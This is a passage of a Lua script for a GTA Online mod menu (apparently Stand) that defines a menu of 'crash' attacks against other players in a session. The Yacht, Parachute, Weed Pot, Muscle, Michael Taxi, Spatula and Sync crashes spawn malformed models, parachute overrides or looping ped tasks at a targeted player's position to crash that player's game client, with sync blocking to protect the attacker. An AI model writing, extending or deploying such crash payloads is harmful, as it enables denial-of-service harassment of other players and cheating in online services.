            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            util.yield(200)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
        menu.trigger_commands("anticrashcamera".. " off")
    end)
	
    --This is a Prisuhm crash fixed by idk who
	
	local krustykrab = menu.list(crashes, "Crusty Crab Crash", {"CrustyCrabCrash"}, "It's risky to spectate, beware: it works on 2T1 users")

    local peds = 5
    menu.slider(krustykrab, "Number of spatulas", {}, "Send spatulas ah~", 1, 45, 1, 1, function(amount)
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "Number of spatulas", {"SpatalusCrash"}, "It's risky to spectate, beware.", function(val)
        menu.trigger_commands("anticrashcamera on")
        util.toast(players.get_name(player_id).. " Spatulas have been sent")
        local crash_toggle = val
        Fewd.BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
            menu.trigger_commands("clearworld")
            menu.trigger_commands("anticrashcamera off")
        end)
    end)

    local nmcrashes = menu.list(crashes, "Normal Model Crashes", {}, "")

    menu.action(nmcrashes, "Yatchy V1", {"Yachtyv1"}, "Event (A1:EA0FF6AD) sending prop yacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user_ped())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)
    
    menu.action(nmcrashes, "Yatchy V2", {"Yachtyv2"}, "Event (A1:E8958704) sending prop yacht001.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user_ped())
        local model = util.joaat("h4_yacht_refproxy001")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)
    
    menu.action(nmcrashes, "Yatchy V3", {"YachtCv3"}, "Event (A1:1A7AEACE) sending prop yacht002.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user_ped())
        local model = util.joaat("h4_yacht_refproxy002")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)
    
    menu.action(nmcrashes, "Yatchy V4", {"Yachtyv4"}, "Event (A1:408D3AA0) sending prop apayacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user_ped())
        local model = util.joaat("h4_mp_apa_yach")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)
    
    menu.action(nmcrashes, "Yatchy V5", {"Yachtyv5"}, "Event (A1:B36122B5) sending prop yachtwin.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user_ped())
        local model = util.joaat("h4_mp_apa_yacht_win")
        local pos = players.get_position(player_id)
        local oldPos = players.get_position(players.user())
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)

    menu.action(nmcrashes, "Yatchy V6", {"YachtCrash"}, "Event (A0:335) \nIt should be fixed, for now", function()
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
        menu.trigger_commands("anticrashcamera ".."on")
        Fewd.BlockSyncs(player_id, function()
            local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(player_id)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
        end)
        menu.trigger_commands("anticrashcamera ".."off")
    end)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
menu.divider(crashes, "Weed Crashes")

	    menu.action(crashes, "Weed Pot Crash", {"weededcrash"}, "", function()
        local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            request_model(-930879665)
            util.yield(10)
            request_model(3613262246)
            util.yield(10)
            request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            request_model(452618762)
            util.yield(10)
            request_model(3613262246)
            util.yield(10)
            request_model(-930879665)
            util.yield(10)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(crashes, "Weed Pot Crash", {"toggleweedcrash"}, "", function(on_toggle)
        local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            request_model(-930879665)
            util.yield(10)
            request_model(3613262246)
            util.yield(10)
            request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            request_model(452618762)
            util.yield(10)
            request_model(3613262246)
            util.yield(10)
            request_model(-930879665)
            util.yield(10)
            return
        end
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
menu.divider(crashes, "Parachute Crashes")
                
menu.toggle_loop(crashes, "Para Crash", {"paracrashv1"}, "Event (A0:336)", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    Fewd.BlockSyncs(player_id, function()
        util.yield(500)

        local bush_hash = 1585741317
        local object_hash = 1043035044
        local heli_hash = util.joaat("p_crahsed_heli_s")
        local flag_hash = util.joaat("prop_beachflag_02")
        local post_hash = util.joaat("prop_traffic_01a")
        local crash_parachute = util.joaat("prop_logpile_06b")
        local parachute = util.joaat("p_parachute1_mp_dec")

        STREAMING.REQUEST_MODEL(crash_parachute)
        STREAMING.REQUEST_MODEL(flag_hash)
        STREAMING.REQUEST_MODEL(heli_hash)
        STREAMING.REQUEST_MODEL(post_hash)
        STREAMING.REQUEST_MODEL(bush_hash)
        STREAMING.REQUEST_MODEL(object_hash)
        STREAMING.REQUEST_MODEL(parachute)

        for i = 1, 1 do
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, crash_parachute)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, flag_hash)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, heli_hash)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, post_hash)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, bush_hash)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, object_hash)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
        end

        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(player_id, parachute)
        util.yield(500)
        menu.trigger_commands("tpmazehelipad")
    end)
end)

        local ents = {}
        local thingy = false
        menu.toggle(crashes, "Muscle Crash", {"musclecrash"}, "Do not spectate them or stand near whilst using this.", function(val,cl)
            thingy = val
            Fewd.BlockSyncs(player_id, function()
                if val then
                    local number_of_things = 30
                    local ped_mdl = util.joaat("ig_siemonyetarian")
                    local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                    local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                    ped_pos.z += 3
                    request_model(ped_mdl)
                    for i=1,number_of_things do
                        local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                        ents[i] = ped
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                        ENTITY.SET_ENTITY_VISIBLE(ped, false)
                    end
                    repeat
                        for k, ped in ents do
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                            TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)  
                        end
                        for k, v in entities.get_all_objects_as_pointers() do
                            if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                                entities.delete_by_pointer(v)
                            end
                        end
                        util.yield_once()
                    until not (thingy)
                    thingy = false
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                else
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                end
            end)
        end)

request_stream_of_entity = function(entity, time)
    local unixtime = util.current_unix_time_seconds()
    local seconds = unixtime + time
    STREAMING.REQUEST_MODEL(entity)
    while not STREAMING.HAS_MODEL_LOADED(entity) and unixtime < seconds do
        STREAMING.REQUEST_MODEL(entity)
        util.yield()
    end
    if STREAMING.HAS_MODEL_LOADED(entity) then
        return entity
    else
        return 0
    end
end

player_coords = function(player_id)
    local player_coords = ENTITY.GET_ENTITY_COORDS(player_index(player_id), true)
    return player_coords
end

local hashes = {
    -877478386,
    2099682835,
}

local vehicleType = { 'kosatka', 'hydra', 'cargoplane', 'cargoplane2', 'luxor', 'bombushka', 'volatol', 'armytrailer2', 'flatbed', 'tug', 'cargobob', 'cargobob2'}
 local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local selectedwep = 1
local ped1 = {}
local spawnDistance = 0
local to_ply = 1
local selected = 1
local spawnedPlanes = {}

--------------------------------------------------------------------------------------------------------------------------------


    menu.action(crashes,"Michael Taxi Crash", {"michaeltaxicrash"}, "Spawns Michael with bad component variations then sets him into taxi performing a bad task.", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, -75.2188, -818.582, 2698.8700, true, true, true)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player_id)
        local mdl = util.joaat("player_zero")
        local veh_mdl = util.joaat("taxi")
        request_model(veh_mdl)
        request_model(mdl)
            for i = 1, 1 do
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_COMPONENT_VARIATION(jesus, 0, 0, 6, 0)
                PED.SET_PED_COMPONENT_VARIATION(jesus, 0, 0, 7, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
                end  
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        util.toast("Michael Taxi Crash Sent to " .. PLAYER.GET_PLAYER_NAME(player_id))
        util.log("Michael Taxi Crash Sent to " .. PLAYER.GET_PLAYER_NAME(player_id))
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(crashes,"Michael Taxi Crash", {"michaeltaxiloop"}, "Spawns Michael with bad component variations then sets him into taxi performing a bad task looped.", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, -75.2188, -818.582, 2698.8700, true, true, true)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player_id)
        local mdl = util.joaat("player_zero")
        local veh_mdl = util.joaat("taxi")
        request_model(veh_mdl)
        request_model(mdl)
            for i = 1, 1 do
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_COMPONENT_VARIATION(jesus, 0, 0, 6, 0)
                PED.SET_PED_COMPONENT_VARIATION(jesus, 0, 0, 7, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    util.toast("Michael Taxi Crash Sent to " .. PLAYER.GET_PLAYER_NAME(player_id))
    util.log("Michael Taxi Crash Sent to " .. PLAYER.GET_PLAYER_NAME(player_id))
end)


function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end
function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControlOfEnt(entity)
            entities.delete_by_handle(entity)
        end
    end
end
function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end
function CreateVehicle(Hash, Pos, static)
    RequestModel(Hash)
    local Vehicle = entities.create_vehicle(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Vehicle, (static or false))
    return Vehicle
end

menu.toggle_loop(crashes, "Sync Crash v1", {"crashv77"}, "", function()
    local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local object = entities.create_object(util.joaat("virgo"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    --local object = entities.create_object(util.joaat("swift2"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("osiris"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_firealarm"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_bs_cond"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_bs_foamx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor07"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor06"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor05"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_bs_gelx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("feltzer3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor02"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("windsor"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor03"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    local object = entities.create_object(util.joaat("v_serv_bs_clutter"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
